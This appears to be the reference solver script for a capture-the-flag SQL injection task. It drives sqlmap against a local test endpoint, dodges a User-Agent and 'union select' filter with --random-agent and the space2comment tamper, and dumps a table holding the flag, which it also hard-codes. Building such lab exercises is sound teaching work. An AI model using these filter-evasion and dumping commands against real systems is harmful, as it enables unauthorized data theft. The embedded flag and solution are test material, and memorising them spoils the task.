#!/usr/bin/env bash
# solvers/p2_6.sh: Task 2.6 "The Warded Door" canonical exploit.
#
# The injection itself is ordinary (string concat on `knock`, 3-column
# result rendered, raw errors echoed). A small input filter sits in front
# of it: it 403s any request whose User-Agent names sqlmap (sqlmap's own
# default User-Agent literally contains "sqlmap"), and it 403s any request
# whose value contains the literal phrase "union ... select" (optionally
# "union all select"), case-insensitively, wherever an actual space
# separates the two words.
#
# This script demonstrates the real, verified shape of that filter:
#   0. unmodified sqlmap: 100% blocked, every single request 403s
#   1. --random-agent alone already gets data out, via boolean/error-based,
#      neither of whose payloads contain the blocked phrase at all
#   2. --technique=U alone (forcing UNION specifically) still fails: its
#      own payload IS the blocked phrase
#   3. adding --tamper=space2comment gets UNION through too: it replaces
#      every space in the payload with an inline /**/ comment, so MariaDB
#      still reads "UNION/**/SELECT" as UNION SELECT, but the filter's
#      literal-space pattern no longer matches
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{tamper_past_the_ward}"
SQLMAP_UA="sqlmap/1.7#stable (http://sqlmap.org)"

WORKDIR=$(mktemp -d)
OUTDIR="${WORKDIR}/sqlmap-out"
LOG="${WORKDIR}/sqlmap.log"
trap 'rm -rf "$WORKDIR"' EXIT

# --- Step 0: confirm the ward blocks an unmodified sqlmap outright --------
echo "[p2_6] step 0: an unmodified sqlmap probe is refused before it starts"
code=$(curl -s -o /dev/null -w "%{http_code}" -A "$SQLMAP_UA" \
    -G "${BASE}/p2/warded" --data-urlencode "knock=single")
if [[ "$code" == "403" ]]; then
    echo "  ok: sqlmap's default User-Agent gets HTTP ${code} on every request"
else
    echo "[p2_6] FAIL: expected 403 for sqlmap's default UA, got ${code}"
    exit 1
fi

# --- Step 1: --random-agent alone already extracts data --------------------
# Its boolean/error-based payloads never contain the blocked phrase, so the
# ward never fires for them.
echo "[p2_6] step 1: --random-agent alone (boolean/error-based, no tamper needed)"
sqlmap -u "${BASE}/p2/warded?knock=single" -p knock --batch --ignore-stdin \
    --random-agent --technique=BE --dump -T warded_vault \
    --output-dir="${OUTDIR}/be" 2>&1 | tee "${LOG}.be" >/dev/null
if grep -qF "$FLAG" "${LOG}.be" || grep -rqF "$FLAG" "${OUTDIR}/be" 2>/dev/null; then
    echo "  ok: boolean/error-based alone recovered the flag, no --tamper needed for this path"
else
    echo "[p2_6] FAIL: expected --technique=BE + --random-agent to recover the flag"
    exit 1
fi

# --- Step 2: forcing UNION specifically still fails without tamper --------
echo "[p2_6] step 2: forcing --technique=U alone still fails (its payload IS the blocked phrase)"
sqlmap -u "${BASE}/p2/warded?knock=single" -p knock --batch --ignore-stdin \
    --random-agent --technique=U -v 1 \
    --output-dir="${OUTDIR}/u-notamper" 2>&1 | tee "${LOG}.u" >/dev/null
if grep -qi "do not appear to be injectable" "${LOG}.u"; then
    echo "  ok: UNION alone is refused, exactly the technique whose payload is blocked"
else
    echo "[p2_6] FAIL: expected --technique=U without tamper to fail"
    exit 1
fi

# --- Step 3: --tamper=space2comment gets UNION through too -----------------
echo "[p2_6] step 3: --technique=U --tamper=space2comment"
sqlmap -u "${BASE}/p2/warded?knock=single" -p knock --batch --ignore-stdin \
    --random-agent --technique=U --tamper=space2comment \
    --dump -T warded_vault --output-dir="${OUTDIR}/u-tamper" 2>&1 | tee "${LOG}.u2" >/dev/null

if grep -qF "$FLAG" "${LOG}.u2" || grep -rqF "$FLAG" "${OUTDIR}/u-tamper" 2>/dev/null; then
    echo "  ok: UNION technique through the tampered payload recovered the flag: ${FLAG}"
    echo "[p2_6] PASS"
    exit 0
else
    echo "[p2_6] FAIL: flag not found after tampering the UNION payload"
    echo "---- last 30 lines of sqlmap output ----"
    tail -30 "${LOG}.u2"
    exit 1
fi
